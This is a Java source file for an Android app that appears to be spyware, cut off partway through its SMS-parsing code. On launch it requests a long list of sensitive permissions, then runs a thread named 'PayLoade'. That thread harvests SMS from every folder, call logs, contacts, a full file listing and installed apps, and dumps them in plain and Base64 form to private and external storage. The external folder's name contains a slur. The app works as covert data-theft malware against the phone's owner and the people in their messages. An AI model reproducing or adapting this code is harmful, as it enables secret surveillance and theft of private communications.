package com.niccher.spget;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import com.niccher.spget.service.Serv;
import com.niccher.spget.usables.Konstants;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.GregorianCalendar;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    Button strt;

    private int reqCode = 20;

    Calendar cal = new GregorianCalendar();
    StringBuffer sbsent, sbinb, sbout, sbdraft, sbfailed, sbcont, sblog, sbflist, sbapps;//sent,sms/draft,sms/outbox,sms/failed
    String flisting,flapps;

    PackageManager pm=null;
    List<ApplicationInfo> aplis=null;

    Konstants kon;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        strt = findViewById(R.id.StartBtn);

        kon = new Konstants();
        pm=getPackageManager();

        strt.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                WiFi();
            }
        });

        Perms();

        PayLoade pl=new PayLoade();
        pl.start();

        //startService(new Intent(getApplicationContext(), Serv.class));
    }

    @Override
    protected void onStop() {
        super.onStop();
        PackageManager packageManager = getPackageManager();
        ComponentName componentName = new ComponentName(MainActivity.this, Splash.class);
        //packageManager.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    private void WiFi() {
        ConnectivityManager connManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

        if (mWifi.isConnected()) {
            Toast.makeText(this, "Wifi Present", Toast.LENGTH_LONG).show();
        } else {
            NetworkInfo[] networkInfo = connManager.getAllNetworkInfo();

            for (NetworkInfo netInfo : networkInfo) {
                //if (netInfo.getTypeName().equalsIgnoreCase("WIFI")){
                //if (netInfo.isConnected()) {txtview.setText("Connected to WiFi")}
                // };
                if (netInfo.getTypeName().equalsIgnoreCase("MOBILE")) {
                    if (netInfo.isConnected())
                        Toast.makeText(this, "Connected to Mobile Data", Toast.LENGTH_LONG).show();
                }
            }
        }
    }

    private void Perms() {

        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.PROCESS_OUTGOING_CALLS) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.PROCESS_OUTGOING_CALLS)) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.PROCESS_OUTGOING_CALLS}, reqCode);
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.PROCESS_OUTGOING_CALLS}, reqCode);
            }
        } else {
            Log.e(kon.TAGGED,"Permission PROCESS_OUTGOING_CALLS Granted");
        }

        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.READ_SMS)) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.READ_SMS}, reqCode);
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.READ_SMS}, reqCode);
            }
        } else {
            Log.e(kon.TAGGED,"Permission READ_SMS Granted");
        }

        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.READ_CONTACTS)) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.READ_CONTACTS}, reqCode);
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.READ_CONTACTS}, reqCode);
            }
        } else {
            Log.e(kon.TAGGED,"Permission READ_CONTACTS Granted");
        }

        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.READ_CALL_LOG)) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.READ_CALL_LOG}, reqCode);
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.READ_CALL_LOG}, reqCode);
            }
        } else {
            Log.e(kon.TAGGED,"Permission READ_CALL_LOG Granted");
        }

        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, reqCode);
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, reqCode);
            }
        } else {
            Log.e(kon.TAGGED,"Permission WRITE_EXTERNAL_STORAGE Granted");
        }

        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.READ_EXTERNAL_STORAGE)) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, reqCode);
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, reqCode);
            }
        } else {
            Log.e(kon.TAGGED,"Permission READ_EXTERNAL_STORAGE Granted");
        }

        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.RECORD_AUDIO)) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.RECORD_AUDIO}, reqCode);
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.RECORD_AUDIO}, reqCode);
            }
        } else {
            Log.e(kon.TAGGED,"Permission RECORD_AUDIO Granted");
        }

        /////////////////

        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ACCESS_CHECKIN_PROPERTIES) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.ACCESS_CHECKIN_PROPERTIES)) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.ACCESS_CHECKIN_PROPERTIES}, reqCode);
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.ACCESS_CHECKIN_PROPERTIES}, reqCode);
            }
        } else {
            Log.e(kon.TAGGED,"Permission ACCESS_CHECKIN_PROPERTIES Granted");
        }

        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ANSWER_PHONE_CALLS) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.ANSWER_PHONE_CALLS)) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.ANSWER_PHONE_CALLS}, reqCode);
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.ANSWER_PHONE_CALLS}, reqCode);
            }
        } else {
            Log.e(kon.TAGGED,"Permission ANSWER_PHONE_CALLS Granted");
        }

        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.ACCESS_FINE_LOCATION)) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, reqCode);
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, reqCode);
            }
        } else {
            Log.e(kon.TAGGED,"Permission ACCESS_FINE_LOCATION Granted");
        }

        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.ACCESS_COARSE_LOCATION)) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.ACCESS_COARSE_LOCATION}, reqCode);
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.ACCESS_COARSE_LOCATION}, reqCode);
            }
        } else {
            Log.e(kon.TAGGED,"Permission ACCESS_COARSE_LOCATION Granted");
        }

        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.ACCESS_BACKGROUND_LOCATION)) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, reqCode);
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, reqCode);
            }
        } else {
            Log.e(kon.TAGGED,"Permission ACCESS_BACKGROUND_LOCATION Granted");
        }

        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.READ_PHONE_STATE)) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.READ_PHONE_STATE}, reqCode);
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.READ_PHONE_STATE}, reqCode);
            }
        } else {
            Log.e(kon.TAGGED,"Permission READ_PHONE_STATE Granted");
        }

        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.CHANGE_NETWORK_STATE) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.CHANGE_NETWORK_STATE)) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.CHANGE_NETWORK_STATE}, reqCode);
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.CHANGE_NETWORK_STATE}, reqCode);
            }
        } else {
            Log.e(kon.TAGGED,"Permission CHANGE_NETWORK_STATE Granted");
        }


        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.RECEIVE_BOOT_COMPLETED) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.RECEIVE_BOOT_COMPLETED)) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.RECEIVE_BOOT_COMPLETED}, reqCode);
            } else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.RECEIVE_BOOT_COMPLETED}, reqCode);
            }
        } else {
            Log.e(kon.TAGGED,"Permission RECEIVE_BOOT_COMPLETED Granted");
        }
    }

    public String getContactName(Context context, String phoneNumber) {
        ContentResolver cr = context.getContentResolver();
        Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                Uri.encode(phoneNumber));
        Cursor cursor = cr.query(uri,
                new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
        if (cursor == null) {
            return null;
        }
        String contactName = null;
        if (cursor.moveToFirst()) {
            contactName = cursor.getString(cursor
                    .getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
        }
        if (cursor != null && !cursor.isClosed()) {
            cursor.close();
        }
        return contactName;
    }

    private void displayDirectoryContents(File dir) {
        try {
            File[] files = dir.listFiles();
            for (File file : files) {
                if (file.isDirectory()) {
                    //Log.e(kon.TAGGED, -Dir - ",file.getCanonicalPath());
                    flisting+=" -Dir - "+file.getCanonicalPath().toString()+"\n";
                    displayDirectoryContents(file);
                } else {
                    //Log.e(kon.TAGGED,\t -File- ",file.getCanonicalPath());
                    flisting+="\t -File - "+file.getCanonicalPath().toString()+"\n";
                }
            }

        } catch (IOException e) {
            Log.e(kon.TAGGED, "-IOException- "+e.getMessage());
        }
    }

    private void copy(File src, File dst) throws IOException {
        InputStream in = new FileInputStream(src);
        try {
            OutputStream out = new FileOutputStream(dst);
            try {
                // Transfer bytes from in to out
                byte[] buf = new byte[1024];
                int len;
                while ((len = in.read(buf)) > 0) {
                    out.write(buf, 0, len);
                }
                Log.e(kon.TAGGED,"Copy done Doneeeeeeeeee");
            } finally {
                out.close();
            }
        } finally {
            in.close();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        switch (requestCode) {
            case 1: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.PROCESS_OUTGOING_CALLS) == PackageManager.PERMISSION_GRANTED) {
                        Perms();
                    } else {
                        Toast.makeText(MainActivity.this, "Unable To PROCESS_OUTGOING_CALLS", Toast.LENGTH_SHORT).show();
                        Perms();
                    }
                    return;
                }
            }
        }

        switch (requestCode) {
            case 1: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                        Perms();
                    } else {
                        Toast.makeText(MainActivity.this, "Unable To READ_SMS", Toast.LENGTH_SHORT).show();
                        Perms();
                    }
                    return;
                }
            }
        }

        switch (requestCode) {
            case 1: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                        Perms();
                    } else {
                        Toast.makeText(MainActivity.this, "Unable To ACCESS_FINE_LOCATION", Toast.LENGTH_SHORT).show();
                        Perms();
                    }
                    return;
                }
            }
        }

        switch (requestCode) {
            case 1: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                        Perms();
                    } else {
                        Toast.makeText(MainActivity.this, "Unable To ACCESS_COARSE_LOCATION", Toast.LENGTH_SHORT).show();
                        Perms();
                    }
                    return;
                }
            }
        }

        switch (requestCode) {
            case 1: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                        Perms();
                    } else {
                        Toast.makeText(MainActivity.this, "Unable To READ_PHONE_STATE", Toast.LENGTH_SHORT).show();
                        Perms();
                    }
                    return;
                }
            }
        }

        switch (requestCode) {
            case 1: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.CHANGE_NETWORK_STATE) == PackageManager.PERMISSION_GRANTED) {
                        Perms();
                    } else {
                        Toast.makeText(MainActivity.this, "Unable To CHANGE_NETWORK_STATE", Toast.LENGTH_SHORT).show();
                        Perms();
                    }
                    return;
                }
            }
        }

        switch (requestCode) {
            case 1: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.RECEIVE_BOOT_COMPLETED) == PackageManager.PERMISSION_GRANTED) {
                        Perms();
                    } else {
                        Toast.makeText(MainActivity.this, "Unable To RECEIVE_BOOT_COMPLETED", Toast.LENGTH_SHORT).show();
                        Perms();
                    }
                    return;
                }
            }
        }

        switch (requestCode) {
            case 1: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ANSWER_PHONE_CALLS) == PackageManager.PERMISSION_GRANTED) {
                        Perms();
                    } else {
                        Toast.makeText(MainActivity.this, "Unable To ANSWER_PHONE_CALLS", Toast.LENGTH_SHORT).show();
                        Perms();
                    }
                    return;
                }
            }
        }

        switch (requestCode) {
            case 1: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
                        Perms();
                    } else {
                        Toast.makeText(MainActivity.this, "Unable To RECORD_AUDIO", Toast.LENGTH_SHORT).show();
                        Perms();
                    }
                    return;
                }
            }
        }

        switch (requestCode) {
            case 1: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                        Perms();
                    } else {
                        Toast.makeText(MainActivity.this, "Unable To READ_CONTACTS", Toast.LENGTH_SHORT).show();
                        Perms();
                    }
                    return;
                }
            }
        }

        switch (requestCode) {
            case 1: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ACCESS_CHECKIN_PROPERTIES) == PackageManager.PERMISSION_GRANTED) {
                        Perms();
                    } else {
                        Toast.makeText(MainActivity.this, "Unable To ACCESS_CHECKIN_PROPERTIES", Toast.LENGTH_SHORT).show();
                        Perms();
                    }
                    return;
                }
            }
        }

        switch (requestCode) {
            case 1: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
                        Perms();
                    } else {
                        Toast.makeText(MainActivity.this, "Unable To READ_CALL_LOG", Toast.LENGTH_SHORT).show();
                        Perms();
                    }
                    return;
                }
            }
        }

        switch (requestCode) {
            case 1: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
                    } else {
                        Toast.makeText(MainActivity.this, "Unable To WRITE_EXTERNAL_STORAGE", Toast.LENGTH_SHORT).show();
                    }
                    return;
                }
            }
        }

        switch (requestCode) {
            case 1: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.PROCESS_OUTGOING_CALLS) == PackageManager.PERMISSION_GRANTED) {
                    } else {
                        Toast.makeText(MainActivity.this, "Unable To WRITE_EXTERNAL_STORAGE", Toast.LENGTH_SHORT).show();
                    }
                    return;
                }
            }
        }
    }

    public void Init(){
        new Thread(new Runnable() {
            public void run() {
                Log.e("Doe","<Thread Start 1>");
            }
        }).start();
    }

    class PayLoade extends Thread {
        @Override
        public void run() {
            super.run();
            Log.e(kon.TAGGED,"<Done Thread>");
            Parser_SMS();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Parser_Logs();
            }
            Parser_Contacts();
            Parser_SD();
            Parser_Apps();

            String bigd="Cc\n"+String.valueOf(sbcont)+"\n\n\n\n*********\n\n\n\n"+String.valueOf(sblog)+"\n\n\n\n*********\n\n\n\n"
                    +String.valueOf(sbinb)+"\n\n\n\n*********\n\n\n\n"+String.valueOf(sbsent)+"*********\n\n\n\n"+String.valueOf(sbout)
                    +"*********\n\n\n\n"+String.valueOf(sbdraft)+"*********\n\n\n\n"+String.valueOf(sbfailed)+"*********\n\n\n\n" + flisting
                    +"*********\n\n\n\n" + (flapps);
            String rilbigd= Base64.encodeToString(bigd.toString().getBytes(), Base64.DEFAULT);

            FileOutputStream fos = null;
            String mas="Maestro.txt";
            String mal="Maest.txt";

            try {
                fos = openFileOutput(mas, MODE_PRIVATE);
                fos.write(bigd.getBytes());

                fos = openFileOutput(mal, MODE_PRIVATE);
                fos.write(rilbigd.getBytes());

                File fi= Environment.getExternalStorageDirectory();
                File fi2=new File(fi.getAbsolutePath()+"/RealNigga");
                fi2.mkdirs();
                File fi3 =new File(fi2,"DumpMal.txt");
                File fi31 =new File(fi2,"DumpMas.txt");
                File fi4 = new File(getFilesDir() + "/" + mal);
                File fi41 = new File(getFilesDir() + "/" + mas);

                copy(fi4, fi3);
                copy(fi41, fi31);

                Log.e(kon.TAGGED,"<Done Writing--------> Saved to " + getFilesDir() + "/" + mas);
                Log.e(kon.TAGGED,"<Done Writing--------> Saved to " + getFilesDir() + "/" + mal);

            } catch (
                    FileNotFoundException e) {
                Log.e(kon.TAGGED,"Error 1  "+e.getMessage());
            } catch (
                    IOException e) {
                Log.e(kon.TAGGED,"Error 2  "+e.getMessage());
            } finally {
                if (fos != null) {
                    try {
                        fos.close();
                    } catch (IOException e) {
                        Log.e(kon.TAGGED,"Error 3  "+e.getMessage());
                    }
                }
            }
        }

        public void Parser_SMS() {
            int sent = 0;
            try {
                sbsent = new StringBuffer();
                Uri smurset = Uri.parse("content://sms/sent");//content://sms/sent,sms/draft,sms/outbox,sms/failed
                Cursor smcus = getContentResolver().query(smurset, null, null, null, null);
                startManagingCursor(smcus);
                if (smcus.moveToFirst()) {
                    for (int ii = 0; ii < smcus.getCount(); ii++) {
                        String namb = smcus.getString(smcus.getColumnIndexOrThrow("address"));
                        String dati = smcus.getString(smcus.getColumnIndexOrThrow("date"));
                        String typ = smcus.getString(smcus.getColumnIndexOrThrow("type"));
                        String threadid = smcus.getString(smcus.getColumnIndexOrThrow("thread_id"));
                        long daty = Long.valueOf(dati);
                        SimpleDateFormat sdf = new SimpleDateFormat("yyyy MMM dd HH:mm:ss");
                        String nombre = getContactName(getApplicationContext(), smcus.getString(smcus.getColumnIndexOrThrow("address")));

                        Date resultdate = new Date(daty);
                        String dateAsText = sdf.format(resultdate);

                        String bod = smcus.getString(smcus.getColumnIndexOrThrow("body"));
                        smcus.moveToNext();
                        sent++;
                        sbsent.append("-------(" + sent + ")--------\nClass -------> M-Sent\nAddress---> " + namb + "\nName---> " + nombre + "\nThread Id---> " + threadid + "\nType---> " + typ + "\nDate---> " + dateAsText + "\nBody---> " + bod + "\n");
                        sbsent.append("\n---------------------------------------\n");
                    }
                }
                smcus.close();
            } catch (Exception e) {
                Log.e(kon.TAGGED, "Msg->Sent Loop >");
            }

            Log.e(kon.TAGGED, "Parser_SMS Sent->Finished at >"+sent);

            int inb = 0;
            try {
                Thread.sleep(50);
                sbinb = new StringBuffer();
                Uri smursinb = Uri.parse("content://sms/inbox");
                Cursor smcusinb = getContentResolver().query(smursinb, null, null, null, null);
                startManagingCursor(smcusinb);
                if (smcusinb.moveToFirst()) {
                    for (int ii = 0; ii < smcusinb.getCount(); ii++) {
                        String recv = smcusinb.getString(smcusinb.getColumnIndexOrThrow("address"));
                        String seda = smcusinb.getString(smcusinb.getColumnIndexOrThrow("_id"));
                        String dat = smcusinb.getString(smcusinb.getColumnIndexOrThrow("date"));
                        String threadi = smcusinb.getString(smcusinb.getColumnIndexOrThrow("thread_id"));
                        String nombr = getContactName(getApplicationContext(), smcusinb.getString(smcusinb.getColumnIndexOrThrow("address")));

                        long daty = Long.valueOf(dat);
                        SimpleDateFormat sdf1 = new SimpleDateFormat("yyyy MMM dd HH:mm:ss");

                        Date resultdate = new Date(daty);
                        String RilD = sdf1.format(resultdate);
                        String bodi = smcusinb.getString(smcusinb.getColumnIndexOrThrow("body"));
                        smcusinb.moveToNext();
                        inb++;
                        sbinb.append("-------(" + inb + ")--------\nClass -------> M-Inbox\nAddress---> " + recv + "\nSenda Name ----->" + seda + "\nName ----->" + nombr + "\nThread Id ----->" + threadi + "\nTime Stamp ----->" + RilD + "\nContent---> " + bodi + "\n");
                        sbinb.append("\n---------------------------------\n");
                    }
                }
                smcusinb.close();
            } catch (InterruptedException e) {
                Log.e(kon.TAGGED, "Msg->In Loop >");
            }

            Log.e(kon.TAGGED, "Parser_SMS Inbox->Finished at >"+inb);

            int out = 0;
            try {
                sbout = new StringBuffer();
                Uri smursout = Uri.parse("content://sms/outbox");//content://sms/sent,sms/draft,sms/outbox,sms/failed
                Cursor smcus = getContentResolver().query(smursout, null, null, null, null);
                startManagingCursor(smcus);
                if (smcus.moveToFirst()) {
                    for (int ii = 0; ii < smcus.getCount(); ii++) {
                        String namb = smcus.getString(smcus.getColumnIndexOrThrow("address"));
                        String dati = smcus.getString(smcus.getColumnIndexOrThrow("date"));
                        String typ = smcus.getString(smcus.getColumnIndexOrThrow("type"));
                        String threadid = smcus.getString(smcus.getColumnIndexOrThrow("thread_id"));
                        long daty = Long.valueOf(dati);
                        SimpleDateFormat sdf = new SimpleDateFormat("yyyy MMM dd HH:mm:ss");
                        String nombre = getContactName(getApplicationContext(), smcus.getString(smcus.getColumnIndexOrThrow("address")));

                        Date resultdate = new Date(daty);
                        String dateAsText = sdf.format(resultdate);

                        String bod = smcus.getString(smcus.getColumnIndexOrThrow("body"));
                        smcus.moveToNext();
                        out++;
                        sbout.append("-------(" + out + ")--------\nClass -------> M-OutBox\nAddress---> " + namb + "\nName---> " + nombre + "\nThread Id---> " + threadid + "\nType---> " + typ + "\nDate---> " + dateAsText + "\nBody---> " + bod + "\n");
                        sbout.append("\n---------------------------------------\n");
                    }
                }
                smcus.close();
            } catch (Exception e) {
                Log.e(kon.TAGGED, "Msg->Out Loop >");
            }

            Log.e(kon.TAGGED, "Parser_SMS Out->Finished at >"+out);

            int draft = 0;
            try {
                Thread.sleep(50);
                sbdraft = new StringBuffer();
                Uri smurdraft = Uri.parse("content://sms/draft");
                Cursor smcusdraft = getContentResolver().query(smurdraft, null, null, null, null);
                startManagingCursor(smcusdraft);
                if (smcusdraft.moveToFirst()) {
                    for (int ii = 0; ii < smcusdraft.getCount(); ii++) {
                        String recv = smcusdraft.getString(smcusdraft.getColumnIndexOrThrow("address"));
                        String seda = smcusdraft.getString(smcusdraft.getColumnIndexOrThrow("_id"));
                        String dat = smcusdraft.getString(smcusdraft.getColumnIndexOrThrow("date"));
                        String threadi = smcusdraft.getString(smcusdraft.getColumnIndexOrThrow("thread_id"));
                        String nombr = getContactName(getApplicationContext(), smcusdraft.getString(smcusdraft.getColumnIndexOrThrow("address")));

                        long daty = Long.valueOf(dat);
                        SimpleDateFormat sdf1 = new SimpleDateFormat("yyyy MMM dd HH:mm:ss");

                        Date resultdate = new Date(daty);
                        String RilD = sdf1.format(resultdate);
                        String bodi = smcusdraft.getString(smcusdraft.getColumnIndexOrThrow("body"));
                        smcusdraft.moveToNext();
                        draft++;
                        sbdraft.append("-------(" + draft + ")--------\nClass -------> M-Drafts\nAddress---> " + recv + "\nSenda Name ----->" + seda + "\nName ----->" + nombr + "\nThread Id ----->" + threadi + "\nTime Stamp ----->" + RilD + "\nContent---> " + bodi + "\n");
                        sbdraft.append("\n---------------------------------\n");
                    }
                }
                smcusdraft.close();
            } catch (InterruptedException e) {
                Log.e(kon.TAGGED, "Msg->Draft Loop >");
            }

            Log.e(kon.TAGGED, "Parser_SMS Draft->Finished >"+draft);

            int failed = 0;
            try {
                Thread.sleep(50);
                sbfailed = new StringBuffer();
                Uri smurfailed = Uri.parse("content://sms/failed");
                Cursor smcusfailed = getContentResolver().query(smurfailed, null, null, null, null);
                startManagingCursor(smcusfailed);
                if (smcusfailed.moveToFirst()) {
                    for (int ii = 0; ii < smcusfailed.getCount(); ii++) {
                        String recv = smcusfailed.getString(smcusfailed.getColumnIndexOrThrow("address"));
                        String seda = smcusfailed.getString(smcusfailed.getColumnIndexOrThrow("_id"));
                        String dat = smcusfailed.getString(smcusfailed.getColumnIndexOrThrow("date"));
                        String threadi = smcusfailed.getString(smcusfailed.getColumnIndexOrThrow("thread_id"));
                        String nombr = getContactName(getApplicationContext(), smcusfailed.getString(smcusfailed.getColumnIndexOrThrow("address")));

                        long daty = Long.valueOf(dat);
                        SimpleDateFormat sdf1 = new SimpleDateFormat("yyyy MMM dd HH:mm:ss");

                        Date resultdate = new Date(daty);
                        String RilD = sdf1.format(resultdate);
                        String bodi = smcusfailed.getString(smcusfailed.getColumnIndexOrThrow("body"));
                        smcusfailed.moveToNext();
